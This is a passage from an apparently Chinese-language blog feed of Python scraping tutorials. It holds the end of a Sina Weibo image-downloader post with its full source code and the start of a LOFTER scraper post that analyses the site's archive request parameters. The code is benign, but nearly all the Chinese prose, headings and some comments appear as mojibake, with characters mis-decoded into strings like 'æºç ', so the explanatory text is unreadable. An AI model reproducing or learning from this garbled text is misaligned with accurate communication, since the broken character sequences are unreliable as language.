    imgurl = img[0].replace(img[1], &#39;large&#39;)
    num_imgs += 1
    try:
        urllib.request.urlretrieve(imgurl, &#39;{}/{}.{}&#39;.format(path, num_imgs, img[2]))
        # display the raw url of images
        print(&#39;\t%d\t%s&#39; % (num_imgs, imgurl))
    except Exception as e:
        print(str(e))
        print(&#39;\t%d\t%s failed&#39; % (num_imgs, imgurl))
</code></pre>
<h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><p>å…¶å®ƒç»†èŠ‚è¯¦è§æºç </p>
<pre><code class="python">#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author: litreily
# date: 2018.02.05
&quot;&quot;&quot;Capture pictures from sina-weibo with user_id.&quot;&quot;&quot;

import re
import os
import platform

import urllib
import urllib.request

from bs4 import BeautifulSoup


def _get_path(uid):
    path = {
        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/sina/&#39; + uid,
        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/sina/&#39; + uid
    }.get(platform.system())

    if not os.path.isdir(path):
        os.makedirs(path)
    return path


def _get_html(url, headers):
    try:
        req = urllib.request.Request(url, headers = headers)
        page = urllib.request.urlopen(req)
        html = page.read().decode(&#39;UTF-8&#39;)
    except Exception as e:
        print(&quot;get %s failed&quot; % url)
        return None
    return html


def _capture_images(uid, headers, path):
    filter_mode = 1      # 0-all 1-original 2-pictures
    num_pages = 1
    num_blogs = 0
    num_imgs = 0

    # regular expression of imgList and img
    imglist_reg = r&#39;href=&quot;(https://weibo.cn/mblog/picAll/.{9}\?rl=2)&quot;&#39;
    imglist_pattern = re.compile(imglist_reg)
    img_reg = r&#39;src=&quot;(http://w.{2}\.sinaimg.cn/(.{6,8})/.{32,33}.(jpg|gif))&quot;&#39;
    img_pattern = re.compile(img_reg)

    print(&#39;start capture picture of uid:&#39; + uid)
    while True:
        url = &#39;https://weibo.cn/%s/profile?filter=%s&amp;page=%d&#39; % (uid, filter_mode, num_pages)

        # 1. get html of each page url
        html = _get_html(url, headers)

        # 2. parse the html and find all the imgList Url of each page
        soup = BeautifulSoup(html, &quot;lxml&quot;)
        # &lt;div class=&quot;c&quot; id=&quot;M_G4gb5pY8t&quot;&gt;&lt;div&gt;
        blogs = soup.body.find_all(attrs={&#39;id&#39;:re.compile(r&#39;^M_&#39;)}, recursive=False)
        num_blogs += len(blogs)

        imgurls = []
        for blog in blogs:
            blog = str(blog)
            imglist_url = imglist_pattern.findall(blog)
            if not imglist_url:
                # 2.1 get img-url from blog that have only one pic
                imgurls += img_pattern.findall(blog)
            else:
                # 2.2 get img-urls from blog that have group pics
                html = _get_html(imglist_url[0], headers)
                imgurls += img_pattern.findall(html)

        if not imgurls:
            print(&#39;capture complete!&#39;)
            print(&#39;captured pages:%d, blogs:%d, imgs:%d&#39; % (num_pages, num_blogs, num_imgs))
            print(&#39;directory:&#39; + path)
            break

        # 3. download all the imgs from each imgList
        print(&#39;PAGE %d with %d images&#39; % (num_pages, len(imgurls)))
        for img in imgurls:
            imgurl = img[0].replace(img[1], &#39;large&#39;)
            num_imgs += 1
            try:
                urllib.request.urlretrieve(imgurl, &#39;{}/{}.{}&#39;.format(path, num_imgs, img[2]))
                # display the raw url of images
                print(&#39;\t%d\t%s&#39; % (num_imgs, imgurl))
            except Exception as e:
                print(str(e))
                print(&#39;\t%d\t%s failed&#39; % (num_imgs, imgurl))
        num_pages += 1
        print(&#39;&#39;)


def main():
    # uids = [&#39;2657006573&#39;,&#39;2173752092&#39;,&#39;3261134763&#39;,&#39;2174219060&#39;]
    uid = &#39;2657006573&#39;
    path = _get_path(uid)

    # cookie is form the above url-&gt;network-&gt;request headers
    cookies = &#39;&#39;
    headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#39;,
            &#39;Cookie&#39;: cookies}

    # capture imgs from sina
    _capture_images(uid, headers, path)


if __name__ == &#39;__main__&#39;:
    main()

</code></pre>
<p>ä½¿ç”¨æ—¶è®°å¾—ä¿®æ”¹<code>main</code>å‡½æ•°ä¸­çš„<code>cookies</code>å’Œ<code>uid</code>ï¼</p>
<h2 id="çˆ¬å–æµ‹è¯•"><a href="#çˆ¬å–æµ‹è¯•" class="headerlink" title="çˆ¬å–æµ‹è¯•"></a>çˆ¬å–æµ‹è¯•</h2><p><img src="/assets/spider/sina/capturer_litreily.png" alt="capture litreily"></p>
<p><img src="/assets/spider/sina/capturer_litreily_end.png" alt="capture litreily end"></p>
<p><img src="/assets/spider/sina/captured_pictures.png" alt="captured pictures"></p>
<h2 id="å†™åœ¨æœ€å"><a href="#å†™åœ¨æœ€å" class="headerlink" title="å†™åœ¨æœ€å"></a>å†™åœ¨æœ€å</h2><ul>
<li>è¯¥çˆ¬è™«å·²å­˜æ”¾è‡³å¼€æºé¡¹ç›®<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">capturer</a>ï¼Œæ¬¢è¿äº¤æµ</li>
<li>ç”±äºæ˜¯é¦–ä¸ªçˆ¬è™«ï¼Œæ‰€ä»¥è®¸å¤šåœ°æ–¹æœ‰å¾…æ”¹è¿›ï¼Œç›¸å¯¹çš„<a href="http://www.litreily.top/2018/03/17/lofter/">LOFTERçˆ¬è™«</a>å°±æ›´å¨´ç†Ÿå†™äº†</li>
<li>ç›®å‰æ²¡æœ‰å‘ç°æ–°æµªå¾®åšæœ‰æ˜æ˜¾çš„åçˆ¬æªæ–½ï¼Œä½†è¿˜æ˜¯æŒ‰éœ€ç´¢å–ä¸ºå¥½</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tools </tag>
            
            <tag> spider </tag>
            
            <tag> sina </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonç½‘ç»œçˆ¬è™«1 - çˆ¬å–ç½‘æ˜“LOFTERå›¾ç‰‡]]></title>
      <url>https://www.litreily.top/2018/03/17/lofter/</url>
      <content type="html"><![CDATA[<p><code>LOFTER</code>æ˜¯ç½‘æ˜“å‡ºå“çš„ä¼˜è´¨è½»åšå®¢ï¼Œçµæ„Ÿæºäºå›½å¤–çš„<code>tumblr</code>ï¼Œä½†æ¯”ä¹‹æ›´åŠ æ–‡è‰ºï¼Œæ›´åŠ æœ¬åœ°åŒ–ã€‚æœ¬äººéå¸¸å–œæ¬¢<code>LOFTER</code>çš„UIè®¾è®¡ï¼Œä»¥åŠå…¶ä¸­çš„ä¼˜è´¨ç”¨æˆ·å’Œå†…å®¹ï¼Œä¼¼ä¹ç½‘æ˜“å¹¶ä¸æ“…é•¿æ¨å¹¿ï¼Œæ‰€ä»¥å—ä¼—å¹¶ä¸å¹¿æ³›ã€‚è¿™éƒ½æ˜¯é¢˜å¤–è¯ï¼Œæœ¬æ–‡ä¸»è¦è®°å½•ä½œè€…è¿‘æœŸå­¦ä¹ <code>python3</code>å¹¶ç”¨ä¹‹çˆ¬å–<code>LOFTER</code>ç”¨æˆ·å›¾ç‰‡çš„è¿‡ç¨‹å’Œæˆæœï¼Œä¸å¤§å®¶äº¤æµåˆ†äº«ã€‚</p>
<blockquote>
<p>æœ¬æ–‡å°†ä»¥æœ¬äºº<a href="http://litreily.lofter.com" target="_blank" rel="noopener">litreily</a>åšå®¢ä¸ºä¾‹è¯´æ˜æ•´ä¸ªçˆ¬å–è¿‡ç¨‹</p>
</blockquote>
<h2 id="åˆ†æLOFTERç«™ç‚¹"><a href="#åˆ†æLOFTERç«™ç‚¹" class="headerlink" title="åˆ†æLOFTERç«™ç‚¹"></a>åˆ†æLOFTERç«™ç‚¹</h2><p>åœ¨çˆ¬å–ç«™ç‚¹ä¹‹å‰ï¼Œé¦–å…ˆéœ€è¦åˆ†æç«™ç‚¹çš„å…³é”®ä¿¡æ¯æœ‰å“ªäº›ï¼Œå¦‚æœç»™è‡ªå·±æé—®ï¼Œå¯èƒ½ä¼šæœ‰ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ol>
<li>ç”¨æˆ·çš„ä¸»é¡µç½‘å€æ ¼å¼æ˜¯ï¼Ÿ</li>
<li>ç”¨æˆ·åšå®¢é“¾æ¥çš„æ ¼å¼æ˜¯ï¼Ÿ</li>
<li>æ¯ç¯‡åšå®¢å†…çš„å›¾ç‰‡é“¾æ¥çš„æ ¼å¼æ˜¯ï¼Ÿ</li>
<li>ä¸åŒç”¨æˆ·çš„ä¸»é¡µæ¨¡æ¿ä¸åŒï¼Œæ˜¯å¦å¯ä»¥æŒ‰åŒæ ·æ–¹æ³•æŠ“å–åšå®¢ä¿¡æ¯ï¼Ÿ</li>
<li>ç”¨æˆ·çš„åšå®¢æ•°é‡å·¨å¤§ï¼Œä¸»é¡µä»¥ä»€ä¹ˆæ–¹å¼åˆ†é¡µï¼Ÿ</li>
<li>æœ‰æ²¡æœ‰å½’æ¡£é¡µé¢æ–¹ä¾¿çˆ¬å–ï¼ˆå¤§å¤šæ•°ç½‘ç«™éƒ½æœ‰å½’æ¡£é¡µé¢ï¼‰ï¼Ÿ</li>
</ol>
<p>å½“ç„¶ï¼Œè¿™äº›é—®é¢˜ä¸æ˜¯ä¸€ä¸‹å­å°±èƒ½æƒ³å‡ºæ¥ï¼Œå¯ä»¥åœ¨æ¢ç´¢ç½‘é¡µå†…å®¹çš„è¿‡ç¨‹é€æ­¥å±•å¼€ï¼Œå¹¶æ€è€ƒä¸‹ä¸€æ­¥è¯¥è€ƒè™‘çš„é—®é¢˜ï¼Œä¸‹é¢é’ˆå¯¹å„ä¸ªé—®é¢˜å¯¹ä¸»é¡µè¿›è¡Œæ¢ç´¢åˆ†æã€‚</p>
<h3 id="ä¸»é¡µä¿¡æ¯"><a href="#ä¸»é¡µä¿¡æ¯" class="headerlink" title="ä¸»é¡µä¿¡æ¯"></a>ä¸»é¡µä¿¡æ¯</h3><blockquote>
<p>ä¸»é¡µ: <code>http://[username].lofter.com</code></p>
</blockquote>
<p><img src="/assets/spider/lofter/litreily.png" alt="litreily"></p>
<p>ä»ä¸»é¡µå¯ä»¥çœ‹åˆ°<a href="http://litreily.lofter.com/view" target="_blank" rel="noopener">å½’æ¡£</a>çš„é“¾æ¥ï¼Œæš‚æ—¶ä¸ç®¡ã€‚ä¸åŒçš„ç”¨æˆ·ï¼Œå…¶ä¸»é¡µæ‰€ç”¨æ¨¡æ¿ä¸å°½ä¸€è‡´ï¼Œ<code>LOFTER</code>ä¸ºæä¾›äº†å¤§é‡ç²¾ç¾çš„ä¸»é¡µæ¨¡æ¿ï¼Œä»¥æ»¡è¶³ä¸åŒç”¨æˆ·çš„éœ€æ±‚ï¼š</p>
<p><img src="/assets/spider/lofter/lofterTemplet.png" alt="lofter templet"></p>
<p>ç„¶è€Œï¼Œæ­£æ˜¯å› ä¸ºæ‰€ç”¨æ¨¡æ¿ä¸åŒï¼Œå…¶ç½‘é¡µå†…å®¹æ ¼å¼ä¹Ÿä¸åŒï¼Œè¿™ä¸ªä»ä¸åŒæ¨¡æ¿ä¸­å›¾ç‰‡çš„ä½ç½®ï¼Œå¤§å°ï¼Œå›¾ç‰‡ä¿¡æ¯ç­‰å°±å¯ä»¥çœ‹å‡ºæ¥ã€‚ç›¸åŒçš„èµ„æºï¼Œä¸åŒçš„å±•ç¤ºæ–¹å¼ï¼Œå°±å¥½åƒåŒæ ·ä¸€ä»¶è‰ºæœ¯å“ï¼Œæ—¢å¯ä»¥æ‘†æ”¾åœ¨ç»ç’ƒæ¡†ä¸­ï¼Œä¹Ÿå¯ä»¥æ‚¬æŒ‚åœ¨é«˜ç©ºã€‚</p>
<p>å½“ç„¶è¿™ä¸æ˜¯æœ¬æ–‡é‡ç‚¹ï¼Œè¿™é‡Œåªæ˜¯ä¸ºäº†è¯´æ˜ä¸åŒç”¨æˆ·çš„ä¸»é¡µä¿¡æ¯å±•ç¤ºä¸ä¸€æ ·ï¼Œä¼šç»™çˆ¬è™«çˆ¬å–å¸¦æ¥ä¸€å®šå½±å“ã€‚</p>
<h3 id="åˆ†é¡µä¿¡æ¯"><a href="#åˆ†é¡µä¿¡æ¯" class="headerlink" title="åˆ†é¡µä¿¡æ¯"></a>åˆ†é¡µä¿¡æ¯</h3><p>ç‚¹å‡»ä¸»é¡µå°¾éƒ¨çš„ä¸‹ä¸€é¡µï¼Œå¯ä»¥è·³è½¬è‡³ä¸‹ä¸€é¡µï¼Œé™¤é¦–é¡µå’Œæœ«é¡µå¤–ï¼Œéƒ½ä¼šæœ‰ä¸Šä¸€é¡µå’Œä¸‹ä¸€é¡µçš„é“¾æ¥ï¼Œè¿™é‡Œå°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæŠ“å–é¦–é¡µä¿¡æ¯ï¼Œç„¶åä»ä¸­æŠ“å–åˆ°<strong>ä¸‹ä¸€é¡µ</strong>çš„é“¾æ¥ï¼Œç„¶åä¸æ–­è·å–<strong>ä¸‹ä¸€é¡µ</strong>çš„åšå®¢ä¿¡æ¯ã€‚</p>
<p><img src="/assets/spider/lofter/pages.png" alt="pages"></p>
<p>æˆ–è€…æ›´ç®€å•ç‚¹ï¼Œçœ‹ç½‘å€æ ä¸­çš„ç½‘å€æ ¼å¼:</p>
<blockquote>
<p>åˆ†é¡µï¼š <code>http://[username].lofter.com/?page=[pageNumber]&amp;t=[timeStamp]</code></p>
</blockquote>
<p>ç›´æ¥ä½¿ç”¨<code>for</code>å¾ªç¯ä¿®æ”¹<code>page</code>å€¼ï¼Œé€é¡µçˆ¬å–åšå®¢ä¿¡æ¯ã€‚è¿™è²Œä¼¼æ˜¯ä¸ªä¸é”™çš„æƒ³æ³•ï¼Œå¥½ï¼Œå‡è®¾è¿™æ ·å¯è¡Œï¼Œé‚£æˆ‘ä»¬æ¥åˆ†ææ¯ä¸€é¡µçš„ä¿¡æ¯ã€‚</p>
<p><img src="/assets/spider/lofter/postLink.png" alt="post link"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé¦–å…ˆæ‰¾åˆ°åšæ–‡æ°¸ä¹…é“¾æ¥<code>http://litreily.lofter.com/post/44fbca_1265bb3e</code></p>
<p>é’ˆå¯¹å«æœ‰å›¾ç‰‡çš„æŸä¸€ç¯‡åšæ–‡ï¼Œ<strong>litreily</strong>æ‰€ç”¨æ¨¡æ¿ä¸­ä¼šå‡ºç°ä¸¤æ¬¡åšæ–‡é“¾æ¥ï¼ˆè§å›¾ä¸­çº¢æ¡†æ ‡æ³¨çš„ä¸¤å¤„ï¼‰ï¼Œå€˜è‹¥æˆ‘ä»¬ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼:</p>
<pre><code class="python">re.findall(r&#39;&quot;http://.*lofter.com/post/[\w_]*&quot;&#39;, html)
</code></pre>
<p>å°†å¯¹æ¯ç¯‡åšæ–‡åŒ¹é…å‡ºä¸¤ä¸ªä¸€æ ·çš„é“¾æ¥ï¼Œè¿™å¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œé‚£å’‹æ•´ï¼ŒåŒ¹é…å®Œå†æŠŠé‡å¤çš„åˆ äº†ï¼Ÿä¸è‡³äºè¿™ä¹ˆéº»çƒ¦ï¼Œç»†çœ‹ä¸¤å¤„é“¾æ¥å‰åä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ä¸¤å¤„é“¾æ¥çš„<code>class</code>å±æ€§ä¸ä¸€è‡´ï¼Œå¥½åŠäº†ï¼Œå’±æ”¹æ”¹æ­£åˆ™ï¼š</p>
<pre><code class="python">re.findall(r&#39;&lt;a class=&quot;img&quot; href=&quot;(http://.*lofter.com/post/[\w_]*)&quot;&gt;&#39;, html)
</code></pre>
<p>å¥½åƒå¯ä»¥äº†ï¼Œè¿™ä¸å°±å¯ä»¥æŒ‰é¡µæŠ“å–åšå®¢é“¾æ¥ï¼Œç„¶åæ¥ç€åˆ†ææ¯ç¯‡åšæ–‡ä¿¡æ¯ä¸å°±å¥½äº†ä¹ˆã€‚æˆ‘åŸæœ¬å°±æƒ³è¿™ä¹ˆå¹²ï¼Œå¯æ˜¯å½“æˆ‘æŸ¥çœ‹äº†ä¸åŒç”¨æˆ·çš„æ’ç‰ˆä»¥åŠç›¸åº”çš„é“¾æ¥ä¿¡æ¯åï¼Œæ•´ä¸ªäººéƒ½ä¸å¥½äº†ï¼Œä¸€åƒä¸ªç”¨æˆ·å°±æ˜¯ä¸€åƒä¸ªå“ˆå§†é›·ç‰¹å•Šã€‚å¦‚æœä½ å‘ç°æœ‰ç»Ÿä¸€è§£ææ‰€æœ‰ç”¨æˆ·æ¨¡æ¿ä¿¡æ¯çš„æ–¹æ³•ï¼Œé‚£è‚¯å®šæ˜¯ä½ çœ‹çš„æ¨¡æ¿ä¸å¤Ÿå¤šã€‚</p>
<p>æ‰€ä»¥å‘¢ï¼Œè¿™æ¡è·¯æ˜¯èµ°ä¸é€šäº†ï¼Œè‡³å°‘æˆ‘æ²¡å†å¾€è¿™æ¡è·¯ä¸Šèµ°ã€‚æ‰“é“å›åºœï¼Œåªä¸è¿‡é‡å¤´å†æ¥ï¼Œè·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢ã€‚</p>
<p>é ï¼Œè¯´äº†åŠå¤©ï¼ŒåŸæ¥èµ°ä¸é€šï¼Œé‚£ä½ è¯´ä¸ªæ¯›çº¿ï¼ï¼ï¼æ·¡å®šæ·¡å®šï¼Œéƒ½æ˜¯æ–‡æ˜äººï¼Œåé¢çš„é£æ™¯å¾ˆè¿œï¼Œé¢ä¸æ˜¯ï¼Œï¼Œï¼Œæ˜¯å¾ˆç¾ï¼Œè¯·è€å¿ƒç­‰å¾…...</p>
<h3 id="å½’æ¡£é¡µä¿¡æ¯"><a href="#å½’æ¡£é¡µä¿¡æ¯" class="headerlink" title="å½’æ¡£é¡µä¿¡æ¯"></a>å½’æ¡£é¡µä¿¡æ¯</h3><blockquote>
<p>å½’æ¡£é¡µï¼š<code>http://[username].lofter.com/view</code></p>
</blockquote>
<p>å¥½äº†ï¼Œè¿˜è®°å¾—å‰é¢è¯´çš„<strong>å½’æ¡£</strong>å§ï¼Œå½’æ¡£å¯æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œå®ƒæŠŠæ‰€æœ‰åšæ–‡éƒ½æŒ‰æ—¥æœŸå½’æ¡£ï¼Œæœ€ä¸»è¦çš„æ˜¯ï¼Œæ‰€æœ‰ç”¨æˆ·çš„å½’æ¡£é¡µé¢éƒ½æ˜¯åŒä¸€ä¸ªæ¨¡æ¿ï¼Œä¸ç®¡å¤§Vå°vè¿˜æ˜¯æ™®é€šè€ç™¾å§“ï¼ŒçœŸçš„æ˜¯ä¸€è§†åŒä»ã€‚å‰©ä¸‹çš„é—®é¢˜å°±æ˜¯<strong>å¦‚ä½•ä»å½’æ¡£é¡µæŠ“å–æ¯ç¯‡åšå®¢çš„çœŸå®è·¯å¾„</strong>ã€‚</p>
<p><img src="/assets/spider/lofter/archive.png" alt="archive"></p>
<p>å…ˆæ¥çœ‹çœ‹å½’æ¡£é¡µé¢çš„ç»“æ„å§ï¼Œåšå®¢æŒ‰æœˆä»½å½’æ¡£ï¼Œæ¯ç¯‡åšå®¢ä»…æ˜¾ç¤ºé¦–å¼ å›¾ç‰‡ç¼©ç•¥å›¾æˆ–çº¯æ–‡æœ¬ã€‚ç„¶å<code>F12</code>æ‰“å¼€è°ƒè¯•å·¥å…·ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ¯ä¸ªæœˆä»½å¯¹åº”ä¸€ä¸ª<code>&lt;div class=&quot;m-filecnt m-filecnt-1&quot;&gt;</code>è¿™æ ·çš„èŠ‚ç‚¹ï¼Œæ¯ä¸ªæœˆä»½èŠ‚ç‚¹åŒ…å«äº†æœ¬æœˆæ‰€æœ‰åšå®¢çš„å…¥å£ä¿¡æ¯ï¼Œä¸€ç¯‡åšå®¢å¯¹åº”ä¸€ä¸ª<code>id</code>å·ï¼Œä»¥åŠä¸€ä¸ªåšå®¢çš„<strong>ç›¸å¯¹è·¯å¾„</strong>ã€‚<code>id</code>ç¥é©¬çš„ä¸ç”¨å…³å¿ƒï¼Œé‡ç‚¹å°±æ˜¯è¿™ä¸ª<strong>ç›¸å¯¹è·¯å¾„</strong>ï¼Œæœ‰äº†å®ƒä¸å°±æœ‰äº†åšå®¢çš„ç»å¯¹è·¯å¾„äº†ä¹ˆã€‚</p>
<ul>
<li>ç›¸å¯¹è·¯å¾„ï¼š&quot;/post/44fbca_1265bb3e&quot;</li>
<li>ç»å¯¹è·¯å¾„ï¼š<code>http://[username].lofter.com/post/44fbca_1265bb3e</code></li>
</ul>
<p><img src="/assets/spider/lofter/archive_html.png" alt="archive structure"></p>
<p>è¿™æ ·çœ‹æ¥ï¼Œé‚£å²‚ä¸æ˜¯åªè¦æŠ“å–è¿™ä¸€ä¸ªå½’æ¡£é¡µé¢å°±å¯ä»¥æŠ“åˆ°æ‰€æœ‰çš„åšå®¢è·¯å¾„äº†å‘¢ï¼Ÿå‘µå‘µï¼ŒçœŸçš„è¿™ä¹ˆå®¹æ˜“å—ï¼Ÿæ˜¾ç„¶ä¸å¤§å¯èƒ½ï¼Œå½“æˆ‘ä»¬ä¸‹æ‹‰é¡µé¢æ—¶ï¼Œå½’æ¡£ä¿¡æ¯å°†åŠ¨æ€åŠ è½½åˆ·æ–°ï¼Œæ²¡é”™ï¼Œæ˜¯åŠ¨æ€çš„ï¼ï¼ï¼æ„æ–™ä¹‹ä¸­çš„çŒä¸åŠé˜²</p>
<p>æ¥ç€æˆ‘åœ¨Chromeæµè§ˆå™¨ä¸­<code>Ctrl+U</code>çœ‹äº†çœ‹ç½‘é¡µçš„æºç ï¼ˆå¤ªé•¿è¿™å°±ä¸æ”¾å›¾äº†ï¼‰ï¼Œæœç„¶ä¸å‡ºæ‰€æ–™ï¼ŒåŠ¨æ€æ•°æ®åœ¨æºç ä¸­æ˜¯æœ¨æœ‰çš„ï¼Œåªæœ‰ä¸€ä¸ªè„šæœ¬åœ¨é‚£é™é™çš„èººç€ï¼Œèººç€ï¼Œèººç€ã€‚ã€‚ã€‚éš¾é“å°±è¦æ”¾å¼ƒäº†å—ï¼Œå½“ç„¶ä¸ï¼<strong>åªè¦æ˜¯ç½‘ç»œé€šä¿¡ï¼Œå°±å¿…ç„¶æœ‰è¯·æ±‚åŒ…å’Œå“åº”åŒ…</strong></p>
<p>é‚£ç°åœ¨çš„é—®é¢˜å°±æ˜¯ï¼ŒåŠ¨æ€ç½‘é¡µçš„æ•°æ®æ˜¯å¦‚æœè·å–åˆ°çš„ï¼ŸåŠ¨æ€æ•°æ®çš„<strong>çœŸå®è¯·æ±‚</strong>æ˜¯ä»€ä¹ˆï¼ŸæŠ“åŒ…çœ‹çœ‹å‘—ï¼Œæ‰“å¼€æµè§ˆå™¨è°ƒè¯•å·¥å…·ä¸­çš„<code>Network</code>ï¼Œåˆ·æ–°å½’æ¡£é¡µï¼Œçœ‹çœ‹é¡µé¢åŠ è½½è¿‡ç¨‹ï¼Œæ‰¾åˆ°çœŸå®è¯·æ±‚ï¼Œè¿™ä¸ªå¾ˆå¥½æ‰¾ï¼Œè¿™ç±»è¯·æ±‚çš„åç¼€ä¸€èˆ¬ä¸ä¼šæ˜¯png,jpg,gif,js,cssç­‰ï¼Œè€Œä¸”å¤šåŠæ˜¯<strong>POST</strong>åŒ…ï¼Œå¹¶ä¸”ä¼šå‡ºç°åœ¨ä¸€å †å›¾ç‰‡è¯·æ±‚çš„å‰é¢ã€‚</p>
<p><img src="/assets/spider/lofter/post.png" alt="post"></p>
<p>å¥½äº†ï¼Œæ‰¾åˆ°äº†ï¼Œå°±æ˜¯ä¸Šé¢è¿™è´§ã€‚ç°åœ¨å½’æ¡£æ•°æ®è¯·æ±‚çš„é“¾æ¥æœ‰äº†ï¼Œç¡®å®æ˜¯<strong>POST</strong>åŒ…ï¼ŒåŒæ ·ï¼Œè¯·æ±‚åŒ…çš„å¤´éƒ¨ä¿¡æ¯<code>headers</code>å’Œè¯·æ±‚å‚æ•°<code>request payload</code>ä¹Ÿæœ‰äº†ã€‚</p>
<p><img src="/assets/spider/lofter/post_values.png" alt="request values"></p>
<p>ç°åœ¨çš„å…³é”®é—®é¢˜æ˜¯ï¼Œè¿™äº›è¯·æ±‚åŒ…ä¸­çš„å‚æ•°éƒ½æ˜¯å¹²å˜›çš„ï¼Ÿç»æˆ‘å¤šæ–¹å°è¯•ã€çŒœæµ‹ä¸è§‚å¯Ÿï¼Œæ€»ç»“å¦‚ä¸‹ï¼š</p>
<pre><code class="C#">callCount=1       # å›ºå®š
scriptSessionId=${scriptSessionId}187   # å›ºå®š
httpSessionId=    # å›ºå®š
c0-scriptName=ArchiveBean       # å›ºå®š
c0-methodName=getArchivePostByTime      # å›ºå®š
c0-id=0           # å›ºå®š
c0-param0=number:4520906        # ç”¨æˆ·IDï¼Œå¯ä»ç”¨æˆ·ä¸»é¡µæºç è·å–
c0-param1=number:1521342313224  # æ—¶é—´æˆ³ï¼Œæœ€æœ€æœ€å…³é”®å‚æ•°ï¼
c0-param2=number:50       # å•æ¬¡è¯·æ±‚åšå®¢ç¯‡æ•°ï¼Œå¯ä»¥æŒ‰éœ€æ±‚ä¿®æ”¹
c0-param3=boolean:false   # å›ºå®š
batchId=822456            # 6ä½éšæœºæ•°ï¼Œçˆ¬å–æ—¶å¯ä»¥å›ºå®š
</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬æ¨¡æ‹Ÿè¯·æ±‚åŒ…çš„æ—¶å€™å°±æŒ‰è¿™ä¸ªæ¥å°±å¯ä»¥äº†ï¼Œè‡³äºæ—¶é—´æˆ³æ€ä¹ˆè·å–ï¼Œè¯·æ±‚åŒ…çš„<code>headers</code>å¦‚ä½•ç¡®å®šï¼Œåé¢ä¼šæœ‰è¯¦è¿°ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹è¯·æ±‚åå¾—åˆ°çš„å“åº”åŒ…é•¿å•¥æ ·ï¼Œlookï¼Œå°±ä¸‹é¢è¿™ä¸ªï¼Œçœ‹åˆ°æ²¡ï¼Œ<strong><code>permalink</code></strong>, åƒå‘¼ä¸‡å”¤å§‹å‡ºæ¥å•Šï¼Œè¿™ä¸å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„åšå®¢å›ºå®šè·¯å¾„äº†ä¹ˆã€‚å“åº”åŒ…å¹¶ä¸æ˜¯<code>html</code>æ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€ç»„æ•°æ®ï¼Œæˆ‘è§‰ç€å½’æ¡£é¡µåŒ…å«çš„é‚£ä¸ªè„šæœ¬å°±æ˜¯æ ¹æ®è¿™ä¸ªæ•°æ®æ–‡ä»¶è¿›è€Œè¯·æ±‚é¦–å¼ å›¾ç‰‡ä¿¡æ¯æˆ–æ–‡æœ¬ä¿¡æ¯çš„ï¼Œå½“ç„¶è¿™æ˜¯æˆ‘çš„çŒœæµ‹äº†ï¼Œæœ‰å…´è¶£çš„å¯ä»¥å»çœ‹çœ‹é‚£ä¸ªè„šæœ¬ã€‚</p>
<p><img src="/assets/spider/lofter/post_response.png" alt="post response"></p>
<p>æœ‰äº†è¿™ç»„æ•°æ®ï¼Œå’±å°±å¯ä»¥è·å–æ¯æ¬¡è¯·æ±‚å¾—åˆ°çš„åšå®¢è·¯å¾„åˆ—è¡¨ï¼Œè¿›è€Œé€ä¸€çˆ¬å–åšå®¢å†…çš„å›¾ç‰‡é“¾æ¥äº†ã€‚</p>
<p>åˆ°æ­¤å¤„ä¸ºæ­¢ï¼Œå½’æ¡£é¡µçš„ä¿¡æ¯å°±åˆ†æå®Œäº†ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“è¯¥å‘é€æ€æ ·çš„è¯·æ±‚åŒ…å»è·å–å½’æ¡£æ•°æ®ï¼Œä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬ä¹ŸçŸ¥é“äº†ä»å½’æ¡£é¡µå¦‚ä½•è·å–æ¯ç¯‡åšå®¢çš„çœŸå®è·¯å¾„ã€‚</p>
<p>ä¸‹é¢å°±æ¥çœ‹çœ‹å½“æˆ‘ä»¬çŸ¥é“åšå®¢è·¯å¾„å¹¶æŠ“å–åï¼Œè¯¥å¦‚ä½•è·å–æ¯ç¯‡åšå®¢æ­£æ–‡å†…çš„å›¾ç‰‡é“¾æ¥ã€‚</p>
<h3 id="åšå®¢é¡µä¿¡æ¯"><a href="#åšå®¢é¡µä¿¡æ¯" class="headerlink" title="åšå®¢é¡µä¿¡æ¯"></a>åšå®¢é¡µä¿¡æ¯</h3><blockquote>
<p>åšå®¢ï¼š <code>http://[username].lofter.com/post/******_********</code></p>
</blockquote>
<p>ä»¥ä¸Šé¢è·å–çš„åšå®¢ <a href="http://litreily.lofter.com/post/33a459_1230cb50" target="_blank" rel="noopener">http://litreily.lofter.com/post/33a459_1230cb50</a> ä¸ºä¾‹ï¼Œå¤§éƒ¨åˆ†åšå®¢å†…çš„å›¾ç‰‡éƒ½ä¸æ­¢ä¸€å¼ ï¼Œè¿™ä¹Ÿæ˜¯å¿…é¡»è®¿é—®åšå®¢é¡µæœ¬èº«çš„ä¸»è¦åŸå› ï¼Œå¥½äº†ç…§æ—§æŸ¥çœ‹é¡µé¢å…ƒç´ ã€‚</p>
<p><img src="/assets/spider/lofter/blog_pic.png" alt="blog pictures"></p>
